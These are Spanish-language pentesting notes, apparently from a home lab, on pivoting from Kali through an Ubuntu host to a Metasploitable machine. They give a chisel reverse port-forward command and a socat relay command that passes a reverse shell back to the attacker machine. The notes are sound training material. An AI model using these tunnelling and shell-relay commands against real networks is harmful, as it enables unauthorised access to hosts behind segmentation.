Tendremos el siguiente escenario:
![[Pasted image 20240115131504.png]]

# Repositorio Socat
```
https://github.com/3ndG4me/socat
```

# Repositorio Chisel
```
https://github.com/jpillora/chisel/releases
```
![[Mis apuntes/ANEXOS/Pasted image 20230804090601.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230804090727.png]]

Nos lo descargamos en nuestra máquina atacante:
![[Pasted image 20240115131742.png]]
![[Pasted image 20240115131805.png]]

Y ahora ejecutamos el servidor con chisel desde nuestra máquina kali para recibir las conexiones:
![[Pasted image 20240115132345.png]]

A continuación, ejecutamos el siguiente comando en la máquina intermedia para indicar que el puerto 80 de la máquina final se convierta en el puerto 5000 de mi máquina atacante:
```bash
./chisel client 192.168.0.37:1234 R:5000:10.10.10.11:80
```
![[Pasted image 20240115132610.png]]

Y entonces ahora nuestro localhost de la máquina kali por el puerto 5000 será el puerto 80 de la máquina final:
![[Pasted image 20240115132637.png]]

Ahora, si queremos conseguir una reverse shell, tenemos que utilizar socat, ya que nosotros podemos ver a la máquina metasploitable, pero sin embargo esta máquina no nos ve a nosotros, por lo que dentro de la máquina intermedia ejecutamos el siguiente comando:
```bash
socat tcp-l:443,fork,reuseaddr tcp:192.168.0.30:443
```
![[Mis apuntes/ANEXOS/Pasted image 20230722162236.png]]

Y ahora la máquina ubuntu estará preparada para servir como puente y enviar la reverse shell a la kali, de tal forma, que todo el tráfico que reciba la máquina ubuntu por el puerto 443 lo va a enviar a la máquina kali por el mismo puerto, por lo que ahora si ejecutamos el comando para obtener una reverse shell, la habremos recibido desde la metasploitable a la máquina ubuntu:
![[Mis apuntes/ANEXOS/Pasted image 20230722162820.png]]

Y en Kali recibimos la conexión:
![[Mis apuntes/ANEXOS/Pasted image 20230722162833.png]]